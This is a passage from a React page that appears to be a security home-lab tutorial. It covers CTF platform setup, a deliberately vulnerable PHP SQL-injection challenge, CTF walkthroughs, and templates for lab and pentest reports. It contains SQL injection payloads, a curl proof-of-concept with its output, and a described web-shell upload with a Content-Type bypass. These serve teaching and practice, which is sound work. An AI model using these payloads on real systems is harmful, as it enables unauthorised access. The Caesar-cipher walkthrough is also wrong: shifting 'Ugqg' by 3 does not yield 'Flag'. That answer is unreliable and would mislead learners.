                  <ShieldAlert className="h-4 w-4" />
                  <AlertTitle>CTF Preparation</AlertTitle>
                  <AlertDescription>
                    Create a VM with all your CTF tools pre-installed and take regular snapshots.
                    Document techniques and solutions for future reference.
                  </AlertDescription>
                </Alert>
              </div>
            </div>
            
            <div className="space-y-4 mt-8">
              <h3 className="text-xl font-semibold">Setting Up Your Own CTF</h3>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h4 className="text-lg font-semibold">CTF Platforms</h4>
                  <p>Set up your own CTF platform for practice or hosting events:</p>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>CTFd</strong> - Popular open-source CTF platform:
                      <CodeBlock language="bash">{`# Using Docker (recommended)
git clone https://github.com/CTFd/CTFd.git
cd CTFd
docker-compose up -d

# Access at http://localhost:8000
# Default admin credentials: admin / password`}</CodeBlock>
                    </li>
                    <li><strong>FBCTF</strong> - Facebook's CTF platform:
                      <CodeBlock language="bash">{`git clone https://github.com/facebook/fbctf
cd fbctf
./extra/provision.sh -m prod -s $PWD

# Access at https://localhost`}</CodeBlock>
                    </li>
                  </ul>
                </div>
                
                <div>
                  <h4 className="text-lg font-semibold">Creating CTF Challenges</h4>
                  <p>Design your own challenges for practice or team training:</p>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>Web Challenges</strong>:
                      <ul className="list-disc pl-6">
                        <li>Create vulnerable web apps with specific flaws</li>
                        <li>Use Docker to containerize challenges</li>
                        <li>Example Dockerfile for a PHP web challenge:
                          <CodeBlock language="dockerfile">{`FROM php:7.4-apache
COPY ./src/ /var/www/html/
RUN chmod -R 755 /var/www/html/
EXPOSE 80`}</CodeBlock>
                        </li>
                      </ul>
                    </li>
                    <li><strong>Binary Challenges</strong>:
                      <ul className="list-disc pl-6">
                        <li>Create vulnerable C/C++ programs</li>
                        <li>Compile with specific protections disabled:
                          <CodeBlock language="bash">{`gcc -fno-stack-protector -no-pie -o vuln vuln.c`}</CodeBlock>
                        </li>
                      </ul>
                    </li>
                    <li><strong>Cryptography Challenges</strong>:
                      <ul className="list-disc pl-6">
                        <li>Implement custom encryption with deliberate flaws</li>
                        <li>Create challenges based on known crypto vulnerabilities</li>
                      </ul>
                    </li>
                  </ul>
                </div>
              </div>
              
              <h4 className="text-lg font-semibold mt-4">Sample CTF Challenge Creation</h4>
              <p>Example of creating a simple web challenge:</p>
              <CodeBlock language="bash">{`# Create a directory for your challenge
mkdir -p web_challenge/src

# Create a vulnerable PHP file
cat > web_challenge/src/index.php << 'EOF'
<?php
  // Vulnerable login page with SQL injection
  $flag = "CTF{sql_injection_master}";
  
  if(isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // Vulnerable query - no sanitization
    $query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
    
    // Simulate database check
    if(strpos($username, "'") !== false || strpos($username, "\"") !== false) {
      // User found through SQL injection
      echo "<div class='success'>Login successful! Here's your flag: $flag</div>";
    } else {
      echo "<div class='error'>Invalid credentials</div>";
    }
  }
?>

<!DOCTYPE html>
<html>
<head>
  <title>Login Challenge</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 40px; }
    .login-form { max-width: 300px; margin: 0 auto; }
    input { width: 100%; padding: 8px; margin: 8px 0; }
    .error { color: red; }
    .success { color: green; }
  </style>
</head>
<body>
  <div class="login-form">
    <h2>Admin Login</h2>
    <form method="POST">
      <input type="text" name="username" placeholder="Username">
      <input type="password" name="password" placeholder="Password">
      <input type="submit" value="Login">
    </form>
  </div>
</body>
</html>
EOF

# Create a Dockerfile
cat > web_challenge/Dockerfile << 'EOF'
FROM php:7.4-apache
COPY ./src/ /var/www/html/
RUN chmod -R 755 /var/www/html/
EXPOSE 80
EOF

# Build and run the Docker container
cd web_challenge
docker build -t web-challenge .
docker run -d -p 8080:80 web-challenge

echo "Challenge is running at http://localhost:8080"
echo "Solution: Use ' OR '1'='1 as the username"`}</CodeBlock>
            </div>
            
            <div className="space-y-4 mt-8">
              <h3 className="text-xl font-semibold">CTF Walkthroughs and Practice</h3>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h4 className="text-lg font-semibold">Web Challenge Example</h4>
                  <p>Walkthrough of a basic web exploitation challenge:</p>
                  <ol className="list-decimal pl-6 space-y-2">
                    <li>Reconnaissance:
                      <CodeBlock language="bash">{`# Scan the target
nmap -sV -p- 10.10.10.10

# Directory enumeration
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt

# Check for hidden files
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,old`}</CodeBlock>
                    </li>
                    <li>Vulnerability identification:
                      <ul className="list-disc pl-6">
                        <li>Found login page at /admin</li>
                        <li>Tested for SQL injection with <code>admin' OR '1'='1</code></li>
                        <li>Successful login reveals admin panel</li>
                      </ul>
                    </li>
                    <li>Exploitation:
                      <ul className="list-disc pl-6">
                        <li>Found file upload functionality in admin panel</li>
                        <li>Uploaded PHP web shell disguised as image</li>
                        <li>Bypassed file type check by modifying Content-Type header</li>
                        <li>Accessed shell at /uploads/shell.php</li>
                      </ul>
                    </li>
                    <li>Flag capture:
                      <CodeBlock language="bash">{`# Using the web shell to find the flag
ls -la /var/www
cat /var/www/flag.txt
# CTF{w3b_h4ck3r_pr0}`}</CodeBlock>
                    </li>
                  </ol>
                </div>
                
                <div>
                  <h4 className="text-lg font-semibold">Cryptography Challenge Example</h4>
                  <p>Walkthrough of a basic cryptography challenge:</p>
                  <ol className="list-decimal pl-6 space-y-2">
                    <li>Challenge description:
                      <blockquote className="border-l-4 border-gray-300 pl-4 italic">
                        We intercepted this encrypted message: <code>Ugqg{fdhvdu_flskhu_lv_fodvvlf}</code>. 
                        The encryption seems pretty ancient. Can you decrypt it?
                      </blockquote>
                    </li>
                    <li>Analysis:
                      <ul className="list-disc pl-6">
                        <li>The format looks like a flag: CTF{...}</li>
                        <li>The "ancient" hint suggests a classical cipher</li>
                        <li>The pattern suggests a Caesar cipher or ROT</li>
                      </ul>
                    </li>
                    <li>Solution approach:
                      <CodeBlock language="python">{`# Python script to brute force Caesar cipher
encrypted = "Ugqg{fdhvdu_flskhu_lv_fodvvlf}"

for shift in range(26):
    decrypted = ""
    for char in encrypted:
        if char.isalpha():
            ascii_offset = ord('a') if char.islower() else ord('A')
            decrypted += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)
        else:
            decrypted += char
    print(f"ROT-{shift}: {decrypted}")`}</CodeBlock>
                    </li>
                    <li>Result:
                      <ul className="list-disc pl-6">
                        <li>ROT-3 produces: <code>Flag{caesar_cipher_is_classic}</code></li>
                        <li>This matches the expected flag format</li>
                        <li>The flag is <code>Flag{caesar_cipher_is_classic}</code></li>
                      </ul>
                    </li>
                  </ol>
                </div>
              </div>
              
              <Alert className="mt-4">
                <Trophy className="h-4 w-4" />
                <AlertTitle>CTF Learning Strategy</AlertTitle>
                <AlertDescription>
                  Start with beginner-friendly platforms like PicoCTF or TryHackMe, then progress to more challenging
                  platforms like HackTheBox. Document your solutions and build a personal knowledge base of techniques.
                  Join a team to learn from others and participate in live competitions.
                </AlertDescription>
              </Alert>
            </div>
          </div>
        </TabsContent>

        {/* Documentation Tab */}
        <TabsContent value="documentation">
          <div className="space-y-6">
            <h2 className="text-2xl font-bold">Documentation & Reporting</h2>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="space-y-4">
                <h3 className="text-xl font-semibold">Lab Documentation</h3>
                <p>
                  Proper documentation is essential for security labs and projects:
                </p>
                
                <h4 className="text-lg font-semibold">Lab Setup Documentation</h4>
                <p>Document your lab environment thoroughly:</p>
                <ul className="list-disc pl-6 space-y-2">
                  <li><strong>Network Diagram</strong> - Visual representation of your lab</li>
                  <li><strong>Inventory</strong> - List of all systems, their roles, and configurations</li>
                  <li><strong>Installation Procedures</strong> - Step-by-step setup instructions</li>
                  <li><strong>Configuration Files</strong> - Backup of important config files</li>
                  <li><strong>Dependencies</strong> - Software versions and dependencies</li>
                </ul>
                
                <h4 className="text-lg font-semibold mt-4">Lab Documentation Template</h4>
                <CodeBlock language="markdown">{`# Security Lab Documentation

## Overview
- **Lab Name**: Home Security Lab
- **Purpose**: Practice network security monitoring and incident response
- **Date Created**: YYYY-MM-DD
- **Created By**: Your Name

## Network Architecture
- **Network Diagram**: [Link to diagram]
- **IP Addressing Scheme**:
  - Management Network: 10.0.1.0/24
  - Attack Network: 10.0.2.0/24
  - Target Network: 10.0.3.0/24

## Systems Inventory

### Security Tools
| Hostname | IP Address | OS | Purpose | Credentials |
|----------|------------|----|---------| ------------|
| kali | 10.0.2.10 | Kali Linux 2023.1 | Attack Platform | user/password |
| securityonion | 10.0.1.10 | Security Onion 2.3 | Monitoring | user/password |

### Target Systems
| Hostname | IP Address | OS | Vulnerabilities | Notes |
|----------|------------|----|-----------------| ------|
| metasploitable | 10.0.3.10 | Ubuntu 8.04 | Multiple | Intentionally vulnerable |
| winserver | 10.0.3.20 | Windows Server 2016 | Unpatched | Domain Controller |

## Setup Instructions
1. Host Machine Configuration
   - Hardware: [details]
   - Virtualization Software: [details]
   - Network Configuration: [details]

2. Network Setup
   - Router Configuration: [details]
   - VLAN Configuration: [details]
   - Firewall Rules: [details]

3. System Installation
   - Kali Linux Installation
     - Download ISO from [URL]
     - Installation steps: [details]
     - Post-installation configuration: [details]
   
   [Repeat for each system]

## Maintenance Procedures
- Backup Process: [details]
- Update Procedures: [details]
- Reset Procedures: [details]

## Troubleshooting
- Common Issues and Solutions: [details]
- Support Resources: [details]`}</CodeBlock>
              </div>
              
              <div className="space-y-4">
                <h3 className="text-xl font-semibold">Security Testing Documentation</h3>
                <p>
                  Document your security testing activities professionally:
                </p>
                
                <h4 className="text-lg font-semibold">Penetration Test Report Template</h4>
                <CodeBlock language="markdown">{`# Penetration Test Report

## Executive Summary
Brief overview of the assessment, key findings, and risk summary.

## Introduction
- **Test Scope**: Systems and networks included in the test
- **Test Period**: Start and end dates
- **Test Methodology**: Approach and frameworks used (e.g., PTES, OSSTMM)
- **Test Limitations**: Constraints and limitations

## Findings Summary
| ID | Vulnerability | Severity | Affected Systems | CVSS Score |
|----|---------------|----------|------------------|------------|
| V-001 | SQL Injection | High | web-app-01 | 8.5 |
| V-002 | Weak SSH Configuration | Medium | all-linux-servers | 5.5 |

## Detailed Findings

### V-001: SQL Injection
- **Severity**: High
- **Affected Systems**: web-app-01 (10.0.3.10)
- **CVSS Score**: 8.5
- **Description**: SQL injection vulnerability in the login form allows authentication bypass and database access.
- **Proof of Concept**:
  \`\`\`
  POST /login HTTP/1.1
  Host: web-app-01
  
  username=admin'--&password=anything
  \`\`\`
- **Impact**: An attacker could bypass authentication, access sensitive data, and potentially execute commands on the database server.
- **Recommendation**: Implement prepared statements for all database queries. Validate and sanitize all user inputs.

[Repeat for each finding]

## Risk Assessment
Analysis of the overall security posture and risk level.

## Recommendations
- **Short-term Actions**: Immediate fixes for critical and high issues
- **Medium-term Actions**: Fixes for medium issues and process improvements
- **Long-term Actions**: Strategic security improvements

## Appendices
- **Tools Used**: List of tools and their versions
- **Methodology Details**: Detailed testing methodology
- **Evidence**: Screenshots, logs, and other evidence
- **Remediation Verification**: Steps to verify fixes`}</CodeBlock>
                
                <h4 className="text-lg font-semibold mt-4">Documentation Tools</h4>
                <ul className="list-disc pl-6 space-y-2">
                  <li><strong>Markdown</strong> - Simple, portable format for documentation</li>
                  <li><strong>Git/GitHub</strong> - Version control for documentation</li>
                  <li><strong>Draw.io/Lucidchart</strong> - Network and architecture diagrams</li>
                  <li><strong>Notion/Confluence</strong> - Collaborative documentation platforms</li>
                  <li><strong>Dradis/Faraday</strong> - Penetration testing reporting tools</li>
                </ul>
              </div>
            </div>
            
            <div className="space-y-4 mt-8">
              <h3 className="text-xl font-semibold">Evidence Collection and Documentation</h3>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h4 className="text-lg font-semibold">Screenshot Best Practices</h4>
                  <p>Properly document visual evidence:</p>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>Include Context</strong> - Show the full window with URL/hostname visible</li>
                    <li><strong>Timestamp</strong> - Include date/time in the screenshot or filename</li>
                    <li><strong>Redaction</strong> - Redact sensitive information (passwords, PII)</li>
                    <li><strong>Naming Convention</strong> - Use consistent naming (e.g., YYYYMMDD_finding-id_description.png)</li>
                    <li><strong>Annotations</strong> - Add arrows or highlights to emphasize important elements</li>
                  </ul>
                  
                  <h4 className="text-lg font-semibold mt-4">Command Output Documentation</h4>
                  <p>Document command-line evidence effectively:</p>
                  <CodeBlock language="bash">{`# Example of documenting command output
# Date: 2023-06-15
# System: kali.lab.local (10.0.2.10)
# Purpose: Demonstrating SQL injection vulnerability

# Command executed:
curl -X POST http://web-app-01/login.php -d "username=admin'--&password=anything" -v

# Output:
# * Connected to web-app-01 (10.0.3.10) port 80
# > POST /login.php HTTP/1.1
# > Host: web-app-01
# > Content-Type: application/x-www-form-urlencoded
# > Content-Length: 35
# >
# * upload completely sent off: 35 out of 35 bytes
# < HTTP/1.1 302 Found
# < Location: admin_panel.php
# < Content-Type: text/html; charset=UTF-8
# <
# * Connection #0 to host web-app-01 left intact
#
# Analysis: The 302 redirect to admin_panel.php confirms successful authentication bypass`}</CodeBlock>
                </div>
                
                <div>
                  <h4 className="text-lg font-semibold">Log Collection and Analysis</h4>
                  <p>Document log evidence properly:</p>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>Preserve Original Logs</strong> - Keep unmodified copies</li>
                    <li><strong>Timestamp Preservation</strong> - Maintain original timestamps</li>
                    <li><strong>Chain of Custody</strong> - Document who collected logs and when</li>
                    <li><strong>Context</strong> - Include system information and collection method</li>
                    <li><strong>Filtering</strong> - Show how logs were filtered for relevance</li>
                  </ul>
                  
                  <CodeBlock language="bash">{`# Example of log collection documentation
# Date: 2023-06-15 14:30 UTC
# System: web-app-01 (10.0.3.10)
# Collector: Security Analyst Name
# Collection Method: SSH access to server, copied /var/log/apache2/access.log
# MD5 Hash of Original Log: 5f4dcc3b5aa765d61d8327deb882cf99

# Command used to extract relevant entries:
grep "admin'--" /var/log/apache2/access.log

# Relevant log entries:
10.0.2.10 - - [15/Jun/2023:14:28:32 +0000] "POST /login.php HTTP/1.1" 302 219 "-" "curl/7.74.0"
10.0.2.10 - - [15/Jun/2023:14:29:15 +0000] "POST /login.php HTTP/1.1" 302 219 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"

# Analysis: Log entries confirm the SQL injection attempts from the attack system (10.0.2.10)`}</CodeBlock>
                  
                  <h4 className="text-lg font-semibold mt-4">Network Traffic Documentation</h4>
                  <p>Document network evidence effectively:</p>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>PCAP Files</strong> - Preserve full packet captures</li>
                    <li><strong>Filtering</strong> - Document Wireshark display filters used</li>
                    <li><strong>Flow Diagrams</strong> - Create visual representations of traffic</li>
                    <li><strong>Protocol Analysis</strong> - Document protocol-specific details</li>
                  </ul>
                </div>
              </div>
              
              <Alert className="mt-4">
                <FileText className="h-4 w-4" />
                <AlertTitle>Documentation Best Practices</AlertTitle>
                <AlertDescription>
                  Always document as you go rather than after the fact. Use a consistent format and structure
                  across all documentation. Include enough detail that someone else could reproduce your work.
                  For security testing, document both successful and unsuccessful attempts.
                </AlertDescription>
              </Alert>
            </div>
            
            <div className="space-y-4 mt-8">
              <h3 className="text-xl font-semibold">Portfolio Development</h3>
              <p>
                Build a professional portfolio to showcase your security skills:
              </p>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h4 className="text-lg font-semibold">GitHub Portfolio</h4>
                  <p>Create a professional GitHub repository for your projects:</p>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>Lab Configurations</strong> - Share your lab setup scripts and configurations</li>
                    <li><strong>Security Tools</strong> - Develop and share security tools or scripts</li>
                    <li><strong>Documentation Templates</strong> - Create and share professional templates</li>
                    <li><strong>CTF Write-ups</strong> - Document your CTF solutions (for public CTFs only)</li>
                    <li><strong>Research Projects</strong> - Share security research findings</li>
                  </ul>
                  
                  <CodeBlock language="markdown">{`# GitHub Repository Structure Example

/security-portfolio
  /lab-setups
    /kali-automation
      setup-kali.sh
      README.md
    /security-onion
      security-onion-config.sh
      README.md
  
  /security-tools
    /log-analyzer
      log-analyzer.py
      README.md
    /port-scanner
      port-scanner.go
      README.md
  
  /ctf-writeups
    /picoctf-2023
      web-exploitation.md
      cryptography.md
    /hackthebox
      machine1.md
      machine2.md
  
  /research-projects
    /wifi-security
      wifi-security-analysis.md
      data-collection.ipynb
  
  /templates
    pentest-report-template.md
    vulnerability-assessment-template.md
  
  README.md  # Main portfolio overview`}</CodeBlock>
                </div>
                
                <div>
                  <h4 className="text-lg font-semibold">Blog/Website Portfolio</h4>
                  <p>Create a professional website or blog to showcase your work:</p>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>About Page</strong> - Professional background and skills</li>
                    <li><strong>Project Showcase</strong> - Detailed write-ups of your projects</li>
                    <li><strong>Technical Blog</strong> - Share your knowledge and insights</li>
                    <li><strong>Learning Journey</strong> - Document your progress and certifications</li>
                    <li><strong>Contact Information</strong> - Professional ways to reach you</li>
                  </ul>
                  
                  <h4 className="text-lg font-semibold mt-4">Portfolio Content Ideas</h4>
                  <ul className="list-disc pl-6 space-y-2">
                    <li><strong>Home Lab Documentation</strong> - Detailed setup and architecture</li>
                    <li><strong>Vulnerable Machine Write-ups</strong> - HackTheBox, TryHackMe, etc.</li>
                    <li><strong>Tool Tutorials</strong> - How to use security tools effectively</li>
                    <li><strong>Research Papers</strong> - Original security research</li>
                    <li><strong>Case Studies</strong> - Anonymized security assessments</li>
                    <li><strong>Capture the Flag Solutions</strong> - Detailed walkthroughs</li>
                    <li><strong>Code Reviews</strong> - Security-focused code analysis</li>
                  </ul>
                  
                  <Alert className="mt-4">
                    <ShieldAlert className="h-4 w-4" />
                    <AlertTitle>Portfolio Security</AlertTitle>
                    <AlertDescription>
                      Never include client data, confidential information, or details about non-public vulnerabilities
                      in your portfolio. Always anonymize and sanitize any real-world examples. Get permission before
                      publishing anything related to work you've done for others.
                    </AlertDescription>
                  </Alert>
                </div>
              </div>
            </div>
          </div>
        </TabsContent>
      </Tabs>
    </div>
  )
}
